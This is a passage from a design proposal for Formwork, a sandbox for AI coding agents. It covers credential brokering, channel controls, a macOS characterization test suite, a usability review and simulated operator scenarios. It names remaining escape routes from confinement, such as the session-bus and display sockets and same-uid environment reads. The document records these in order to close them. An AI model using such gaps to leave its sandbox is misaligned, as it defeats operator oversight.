      field expressing a subset of the first, and it could not be turned off by a downstream layer
      without inventing a posture rule for a boolean. A group inside `channels` gives the same one
      word and inherits the deny-terminal merge for free.
    - Rejected alternative: groups as patterns (`desk*`). Groups are exact lists in the schema, so
      adding a channel to a group is a reviewed schema change, not something a blueprint can widen
      ([FW-CAP2](../formwork.md#fw-cap2)).
  - **`isolate`** — a subset of `["processes", "ipc"]`.
    - Rejected alternative: making it automatic. Process isolation is visible to tools, and
      transparency is the default.
    - Removed member: `tmp`. A private temp directory is free in the directory form on both
      platforms and is now default behaviour (`FW-TRA9`), not a field.
- **Catalog.** Additions, which bump the embedded catalog version:
  - an optional `broker` block;
  - a `services` location kind;
  - the `os-keyring` type;
  - the `claude` type's macOS keychain location.
- **CLI.**
  - No new subcommand.
  - `explain` accepts URLs and channel names positionally (§3.5).
  - No new flags. Two earlier-draft flags are withdrawn: `run --gateway <socket>` (the refusal plus
    the spawn-posture alternative, `FW-EGR14`, covers the need) and `--blueprint -` (`--blueprint
    /dev/fd/N` already works and does not consume the workload's stdin).
  - Two Launcher-provided files: the opener shim (`FW-ISO17`) and the CA bundle. Both are
    Launcher-owned paths under `FW-TRA9`.
- **Profiles.** Unchanged: `builtin:default` only. `builtin:desktop` was proposed and withdrawn
  (§3.4). `builtin:default` loses its explicit `reads = ["/**"]` row (D10).
- **Default profile.** It gains the channel baseline, the privileged-interface baseline, and the
  environment-disclosure deny, all gated by `FW-E2E-084` and the toolchain tests
  ([FW-E2E-020](../formwork.md#fw-e2e-020)..023) on both OSes.
- **Examples.**
  - The `claude-code`, `codex` and `opencode` blueprints move from `ports = [443]` to
    `net = { hosts = [...] }` with brokering.
  - Each gains a short "what the baseline blocks and how to lift it" note.
  - The README quickstart stays at most five lines, and FW IDs stay out of the README (document
    audience rule).
- **Dependencies (the hardest no).**
  - `rustls`, `rcgen` and `hyper`, confined to `formwork-gateway`. They are needed only for
    inspection. `rustls` is chosen over OpenSSL for a memory-safe trust base.
  - The Linux supervisor uses raw `seccomp(2)` and needs no new crate. The macOS peer check uses
    `libproc` through `libc`.
- **Deprecations.** None. The FEP adds surface and renames nothing.

---

## 7. Proposed amendments to the landed docs (apply on landing)

- **`docs/fep-1.md` Non-goals.** Replace the TLS-interception and credential-masking bullets with a
  pointer to FEP-5 §3.2. Fix the `AllowHosts` TOML spelling as `net = { hosts = [...] }`. Close the
  open host-pattern question with the §6 grammar.
- **`formwork.md` [FW-XR7](../formwork.md#fw-xr7).** The confined process *issues* a `connect()`;
  under supervised connect the Gateway *performs* it and installs the result. Reword "never
  performs an in-sandbox `connect()`" to "never completes a `connect()` of its own", which is what
  the seam guarantee protects.
- **`formwork.md` §5.8 / [FW-BP2](../formwork.md#fw-bp2).** Name the discovered layer in the merge
  order, where the loader already places it (after `--set`, before the sugar flags;
  `blueprint_load.rs:198-258`). The team scenario found the spec and the loader disagree today.
- **`formwork.md` §3 threat model.** Add to the in-scope list: "a confined process causing a process
  outside its session to act on its behalf — execute, open a URL, perform egress, or disclose a
  secret — through a host service" (`FW-INV14`).
- **`formwork.md` §9.**
  - Correct the Linux cross-domain bullet: Landlock scoping covers abstract sockets and signals;
    `/proc/<pid>/environ` of same-uid processes stays readable without a PID namespace.
  - Add the macOS SBPL operations and the Linux supervisor.
  - Add a fidelity row per `FW-FID8` line.
  - Copy §3.6.
  - Correct the Linux UDP/AF_UNIX rows and the macOS resolver row.
- **`formwork.md` §5.3.** Reword [FW-ISO8](../formwork.md#fw-iso8) to cover both backends.
- **`formwork.md` §11.**
  - Close "fd-minting default" (on-demand via the supervisor on Linux; a static endpoint on macOS).
  - Close "Credential brokering".
  - Narrow "Linux gateway egress isolation build-vs-buy" to the optional netns path.
- **`docs/unstated-requirements.md`.** Mark item 12 minted as `FW-XR10`, and item 10 as applied by
  §4.1's CI changes.
- **`constitution.md` Vocabulary.**
  - **broker**: the Gateway presenting a credential it holds, never disclosing its bytes.
  - **placeholder**: the per-session stand-in for a brokered env var.
  - **inspect**: TLS termination at the Gateway for a host rule that needs request-level policy.
  - **supervise**: the Gateway receiving a confined `connect()` through seccomp user notification
    and minting the connection itself.
  - **channel**: a host service that can act outside the sandbox on a confined process's behalf,
    named by a portable enum value.
  - **characterize**: a CI test that records how a platform mechanism behaves, run before a
    requirement relying on it is anchored.

---

## 8. Open questions and the characterization suite

### 8.1 macOS characterization suite (settles every **(characterize)** mark)

These run in CI on `macos-14` and `macos-15`, with `FW_REQUIRE_EXERCISED=1`. Each test records the
observed behavior as a fixture that later requirement tests assert against. A change across macOS
releases therefore fails CI visibly, instead of silently widening the sandbox.

| # | Question | Test shape |
|---|---|---|
| C1 | Do SBPL remote filters accept only `*` / `localhost` hosts? | Compile profiles with a literal-IP remote filter and assert on the `sandbox_init` result |
| C2 | Is the `PROC_PIDFDSOCKETINFO` peer lookup reliable, including under churn and for reparented descendants? | 1,000 connections from a confined process tree, with 10 % reparented. Assert that every one is attributed |
| C3 | Which `mach-lookup` names do `open`, `launchctl submit`, AppleEvents, `pbcopy`/`pbpaste`, `security` and `screencapture` use? | Run each probe under a `(deny mach-lookup)` profile and harvest the deny records. The harvested set becomes the checked-in channel map |
| C4 | Are `lsopen` and `appleevent-send` checked for a `sandbox_init` process? Does `(deny default)` close them (Omnigent parity)? | Fixture app, with a control run |
| C5 | Does `kern.procargs2` return same-uid environments, and does a `sysctl-name` deny close it? Which MIBs does `ps` use? | Canary sibling, control run, then confined |
| C6 | Which `(target …)` forms keep in-session process management working? | Shell job control, `node` `child_process`, `make -j`, `python -m multiprocessing` under the filters |
| C7 | Can POSIX IPC be confined to a session prefix? | `multiprocessing` shared memory, Node workers |
| C8 | IOKit allowlist and transparency | The toolchain suite plus `swift build`, Homebrew, `gh` and Xcode CLT under the privileged-interface baseline; harvest the `iokit-open` denies |
| C9 | What is Claude Code's keychain item and login flow? | Run the example's smoke command; record the keychain and `lsopen` denies |

### 8.2 Other open questions

- **D3 layout.** Three options:
  - `.formwork/` in the project (recommended: committable, and it keeps the team workflow);
  - a per-user state directory (the root is not split, but learned grants become machine-local);
  - Landlock `Make*` rights on the split root, rejected because they propagate into hole
    directories.
- **HTTP/2 on inspected hosts.** Offer HTTP/1.1 only through ALPN, or add an h2 codec? A spike
  against the model-API clients decides.
- **Per-process trust on macOS.** Security.framework clients ignore env-var trust. None of the
  candidates is scoped to one process:
  - a keychain search list is per user;
  - `SecTrustSettings` has no per-process scope.

  Revisit if a brokered type's primary client can't be replaced.
- **Narrower keychain lifts on macOS.** Brokering the Claude credential would need the Gateway to
  read the item and substitute it, the same as `FW-CRED11`. It only works if the client reads its
  token from an env var or a file as well as the keychain. Characterization (C9) decides.
- **Request-signing credentials** (SigV4, GCP): these need a signer in the Gateway. Deferred.
- **Placeholders in request bodies:** out of scope unless a Catalog type needs them.
- **Transparent mode.** The supervisor could redirect any allowed `connect()` on Linux, but that
  needs a DNS answer path. On macOS it would need a Network Extension.
- **Network Extension on macOS.** Per-process attribution and synchronous violations. It needs a
  signed system extension and an entitlement, and it is not proposed while releases are unsigned.
- **Namespace-tier init (Linux).** A forked Formwork process, or the launcher re-parented. Pre-exec
  code does not allocate, which constrains the choice.
- **`(deny default)` base on macOS.** A candidate for `strict` once C3 and C8 yield a complete
  allowlist for common toolchains.
- **`sandbox_init` deprecation.** The replacements would be Endpoint Security (which needs an
  entitlement) or App Sandbox containers (which don't fit arbitrary CLI trees). The
  Compiler/Confiner split keeps the change within one crate.
- **Landlock pathname-socket scoping.** If a future ABI mediates pathname `connect()`, `FW-ISO12`
  moves to Landlock.
- **D-Bus filtering proxy (Linux).** The only way to separate `os-keyring` from `run-outside` on a
  Linux desktop is a bus proxy that admits named destinations (`org.freedesktop.secrets`) and
  refuses others. It is a new component with its own trust surface (xdg-dbus-proxy exists and is
  what Flatpak uses). Deferred; the coupling is reported until then.
- **Local overlay convention.** A team file allows the widest set; a member who wants *less* uses
  `--set`. A member who wants a personal *file* has no discovered location for it (the BP8 walk
  finds the project file first) and must pass `--blueprint` every run. A gitignored
  `.formwork/local.toml`, merged after the project file, would give the idiom. Growth says no until
  a second team asks; recorded here so the ask has a name.
- **Discovered layer per platform.** One `.formwork/*.discovered.toml` per blueprint; learned fs
  paths are platform-shaped (`~/Library/Caches` vs `~/.cache`) and two OSes rewrite the same file.
  Channel and host proposals are portable and unaffected. Whether the discovered layer splits per
  backend is a FEP-4-adjacent question, not FEP-5's.
- **Portable fs groups for `closed` mode.** The team scenario's 31-line file was half platform
  paths (`/opt/homebrew`, `/System`, `~/Library/Caches` on one side; `/lib64`, `~/.cache` on the
  other), and none of it is FEP-5's doing: closed mode grants the platform's toolchain essentials
  and nothing else. D11 widens the essentials to `/etc` and `/proc`. The next step, which would
  make unveil mode the reasonable default on a laptop, is one or two exact schema groups that expand
  per backend the way `desktop` does — `caches` (`~/.cache/**` / `~/Library/Caches/**`) and
  `toolchain` (Homebrew, rustup/cargo, nvm, uv). It is the same move FEP-5 makes for channels, it is
  reviewed like a group, and it is the recommended FEP-6.

---

## 9. Usability review of this proposal

This section applies the seven criteria of `docs/usability-review.md` and the norms of
`docs/unstated-requirements.md` (several now minted) to the draft this FEP replaced. Each finding
changed the text above.

| Criterion / norm | Finding in the earlier draft | Resolution |
|---|---|---|
| **Parity** ([FW-XR6](../formwork.md#fw-xr6)) | Channel lifts were spelled `allow:service:<mach-name>`, so the same blueprint meant nothing on Linux. `isolate`'s `procargs` member named a macOS sysctl | Portable `channels` enum and `os-keyring` type (§3.4); `isolate` members renamed `processes` / `ipc` / `tmp`; environment protection default-on on macOS and honestly `Partial` on Linux without the tier (`FW-ISO16`) |
| **Honest promises** / surface fail-fast ([FW-XR9](../formwork.md#fw-xr9)) | "Fail loudly at the requested verdict" was undefined: a blueprint cannot request a verdict. `AllowHosts` under `confine-self` had no stated failure point. A `gh` user on macOS learned about the CA problem from a TLS error mid-session | Unenforceable is refused before spawn, and `Partial` runs with one named residual line (§1.1, `FW-ISO10`, `FW-EGR14`). Client-trust caveats are surfaced before the run by `explain` and the operator channel (§3.2) |
| **CLI simplicity** / Growth | `run --gateway <socket>` added surface for a posture embedders don't use | Withdrawn. `run` hosts the Gateway, and `confine-self` + `AllowHosts` is refused with the alternative named (`FW-EGR14`). New inputs to `explain` are positional arguments typed by shape, not new subcommands |
| **Docs** / audience layering | The earlier draft said nothing about what users see | §6 keeps the README quickstart to at most five lines with no FW IDs, and puts channel and brokering recipes in `examples/` |
| **Examples** | The baseline would have silently broken the flagship Claude Code example on macOS (keychain credential, browser login) | `claude` Catalog type gains its keychain location; the example documents a login-only `open-url` layer; `FW-E2E-084` runs every example on both OSes |
| **Explainability** ([FW-FID6](../formwork.md#fw-fid6)) | New denial kinds (host, request, channel, socket) had no `explain` path and no runtime message | `explain` accepts URLs, channels and sockets; `FW-FID9` puts a rule and an `explain` hint on every new refusal, including the TLS `unknown_ca` diagnosis |
| **Good defaults** / CLI simplicity | Six channel names with no grouping: a laptop user had to list them one by one, and a CI blueprint extending a team profile had no way to close them again | `desktop` and `media` groups inside `channels`, deny terminal across layers (`FW-BP9`, §3.4). A `builtin:desktop` profile was added here and then withdrawn in §10 |
| **Good defaults** | The operator had to know an agent's hosts and channels in advance to write `net.hosts` / `channels` | `learn` proposes both (`FW-DISC12`), with the floor rule extended to metadata IPs and keyring channels |
| Resolved-input disclosure ([FW-FID7](../formwork.md#fw-fid7)) | Listener endpoint, CA path, session tmp, and the D3 layout were auto-chosen and undisclosed | All are named in `compile` / `explain` output (§3.5); placeholders are named by type, never by value |
| Discovery trust scope ([FW-BP8](../formwork.md#fw-bp8)) | D3's first fix moved learned grants to a machine-local state directory, which changed the team workflow | Recommended `.formwork/` in the project, inside the unchanged BP8 walk (§2, §8.2) |
| Loop drivability ([FW-DISC11](../formwork.md#fw-disc11)) | New denial kinds had no path into the observe/list/accept loop | `FW-DISC12` feeds them into the existing loop; no new artifact files |
| Results vs telemetry | Violation and diagnosis lines had no channel assigned | Refusal explanations go on the operator channel (stderr). The exit-code attribution line was first put on stdout as a "result"; §10 moved it to stderr, because `run`'s stdout belongs to the workload |
| Exit codes (item 12) | Two new failure modes after spawn (Gateway, supervisor) made "agent failed" and "sandbox failed" indistinguishable to an embedder | Minted as `FW-XR10`: exit `125` plus an attribution line |
| Least-convenient test shape (item 4) | Tests used comfortable workloads, and channel tests depended on Safari, Finder and TCC grants | Millisecond probes, a fixture app as the marker, `deny-record-only` evidence declared (§4.1) |
| Evaluation blind spot (honesty is bidirectional; item 10) | The Linux evaluation ran in a headless container and did not see the session-bus, user-manager and display-socket escape; the same blind spot exists on CI runners, and an operator on a desktop had no way to learn the residual applied to them | The suite starts its own session facilities and records which it provided (§4.1); `detect` names the reachable facilities per host (`FW-FID10`, `FW-E2E-087`) |
| Verification states where it ran (item 10) | Claims marked "spike" had no execution plan; a skipped test could look like a pass | Characterization suite in CI on two macOS majors; `FW_REQUIRE_EXERCISED=1`; `ubuntu-24.04` added to exercise the user-namespace refusal path |

---

## 10. Scenario simulation

Four operators were simulated against the previous revision of this document as if it were
implemented, each writing the blueprint they would author, walking their command sequence, and
tracing `read-mode = "closed"` (unveil) against every new mechanism. The transcripts were then
re-evaluated here; claims that could be checked against the landed code were. This section records
what held up, what was rejected, and what changed. Everything marked *changed* is applied above.

| Scenario | Blueprint size under `closed` | What broke |
|---|---|---|
| 1. Solo developer, macOS 15, Claude Code (OAuth login, brokered Anthropic and GitHub, clipboard, cargo) | 21 lines, 7 attributable to FEP-5 | CA bundle unreadable; OAuth loopback callback denied; `git push` never presents a placeholder; `builtin:desktop` + deny-terminal made login impossible; the `anthropic` placeholder switched Claude Code out of OAuth mode |
| 2. Headless CI, Ubuntu 24.04 (Landlock v4, AppArmor userns restriction), `codex exec`, `npm ci`, `gh pr create` | 24 lines | `isolate = ["processes"]` refused on 24.04 and accepted on 22.04 from one file; one `scheme` per type cannot serve `github.com` Basic and `api.github.com` Bearer; `/proc/self` for grandchildren ungrantable; `learn` from an empty universe is one path per pass |
| 3. Omnigent embedder: Option B under bwrap, and a `linux_landlock` fallback | generated | Brokering keyed to compiled-in Catalog types cannot express user-defined credentials; no JSON schema for any new report line; the exit-code attribution line on stdout corrupts the stream-json protocol; `--blueprint -` consumes the workload's stdin under `confine-self`; the egress grammar (wildcards, ports, `*` method, path glob) was unspecified |
| 4. Four-person team, one committed file, Linux GNOME / macOS / devcontainer / CI | 31 lines, half platform paths | On Linux `open-url`, `run-outside` and `os-keyring` are one socket; lifting a channel did not re-admit the scrubbed `DISPLAY`/`DBUS_*` vars, so the lift was a silent no-op; brokering forces inspection, inspection breaks `gh` on macOS, and a downstream layer cannot un-broker |

**Verified in the landed code while re-evaluating (now D10 and D11):**
- `extends = ["builtin:default"]` + `mode = "unveil"` is not closed: the profile's explicit
  `reads = ["/**"]` survives the mode flip. Every scenario blueprint above was silently ambient.
- Under `closed`, a grandchild cannot read `/proc/self`, and `/etc` is not in the essentials. A shell
  that launches `node`, `cargo` or `go` breaks. Both are landed defects, independent of FEP-5, and
  both hit the mode this project treats as its primary one.

### 10.1 Changes made

| Finding | Scenarios | Change |
|---|---|---|
| Launcher-created paths (CA bundle, tmp) unreadable under `closed` | 1, 2, 3, 4 | `FW-TRA9`: Launcher-owned paths are implicit grants in every read mode, disclosed under FID7 |
| Two credential lists with a parse-error intersection; brokering forces inspection and cannot be undone downstream | 1, 2, 4 | `broker-credentials` removed; brokering is the `broker:<type>` grade on `allow-credentials`; a type in both forms resolves to `broker` |
| One `scheme` per type; `git push` presents no placeholder | 1, 2 | Catalog `broker` block is a list of `{ hosts, scheme }`; swap-on-access adds the header when absent (`FW-CRED11`) |
| User-defined credentials unrepresentable | 3 | Inline `{ name, env, hosts, scheme }` bindings in `allow-credentials` |
| `tmp` inside `isolate` forces PID-isolation vocabulary on debugger users; `isolate` all-or-nothing across a CI matrix | 1, 2 | Private tmp is default-on (directory form), removed from `isolate`; the XR9 refusal names the `sysctl`, bwrap, and dropping the member |
| Linux session bus carries three channels | 4 | `open-url` brokered through the Gateway shim (`FW-ISO17`) on both platforms, never a host-service lift; `os-keyring` reported as coupled with `run-outside` on Linux; D-Bus proxy an open question |
| Lifted channel's clients cannot find their socket | 4 | A lift re-admits its locator variables (`FW-BP9`) |
| `builtin:desktop` redundant or harmful; contradicted "not a standing grant" | 1, 4 | Withdrawn; `channels = ["desktop"]` is the one word |
| `channels = "deny"` ambiguous between posture and terminal list | 4 | Posture (empty allow), stated in `FW-BP9` |
| OAuth loopback callback denied on macOS | 1 | `FW-EGR8` allows `network-bind`/`network-inbound` on `localhost:*` |
| Report lines have no JSON keys; FID10 probe breaks compile purity | 3 | Stable `Capability` keys and a `withheld` list in §3.5; probing moved to `detect`/HostProfile |
| Attribution line on stdout | 3 | `FW-XR10`: stderr; `run` writes nothing of its own to stdout |
| `--blueprint -` eats the workload's stdin | 3 | Withdrawn; `--blueprint /dev/fd/N` already works. FEP-5 adds no CLI flags |
| Egress grammar unspecified | 3 | Pinned in §6 (host wildcard, port, `*` method, Omnigent-compatible path glob); closes FEP-1's open question |
| 403 body named the rule (oracle) | 3 | `FW-FID9`: generic body to the agent, detail on the operator channel |
| Placeholder vs env scrub ordering | 1, 2, 3 | Stated: strip, scrub, then placeholders and proxy vars |
| Brokered `anthropic` fights OAuth Claude Code | 1 | Example ships an OAuth variant that brokers nothing |
| `learn` under `closed` from zero | 2 | Points at FEP-4 permissive recording |
| Landed doc drift: FW-BP2 omits the discovered layer; FW-XR7 wording vs supervised connect | 2, 4 | §7 amendments |

### 10.2 Findings accepted as limitations, not changed

- **Deny-terminal channels mean a shared file is written at its widest and narrowed at the leaf.**
  This is the landed fs model; making channel denies reopenable would give channels a merge rule
  paths do not have. Stated in §3.4 and the examples.
- **Brokering a credential whose client verifies through Security.framework does not work on macOS**
  (`gh`). The pre-run notice makes it XR9-shaped. A mixed-OS team exposes `github` instead of
  brokering it, and the file says why. Per-process trust on macOS stays an open question.
- **Whole-keychain lift on macOS.** Lifting `os-keyring` for Claude Code's OAuth item also exposes
  `gh`'s and git's stored tokens, which makes brokering `github` on the same Mac largely redundant.
  Reported; a narrower lift needs a mechanism Seatbelt does not have.
- **Closed-mode fs grants are platform-shaped.** Half of the team file. Not FEP-5's doing and not
  fixed here; §8.2 recommends portable fs groups as FEP-6 and D11 widens the essentials so the
  common breakage stops.
- **`/proc/**` under `closed` on Linux reopens G8.** Honest `Partial`; only the PID namespace closes
  it.

### 10.3 Complexity verdict

Concepts an operator meets, before and after this section: `channels` (+ two groups), brokering as
a grade of `allow-credentials`, `net.hosts` entries that may carry `methods`/`paths` (which makes a
host inspected), and `isolate`. That is four, down from seven (`broker-credentials`,
`isolate.tmp`, `builtin:desktop` gone; `--blueprint -` and `--gateway` gone). The README quickstart
is unchanged at three lines and still honest; the five-line variant with a host allowlist and one
brokered key is §3.2. Everything else an operator writes under `closed` is the price of closed mode
itself, and D10/D11 plus the FEP-6 groups are what lower it.

The simulation method is worth keeping: three of the four blockers it found (CA bundle under
`closed`, the shared session-bus socket, the stdout attribution line) were invisible to the
usability-criteria review in §9, which checked the design against rules rather than against a
person trying to use it.
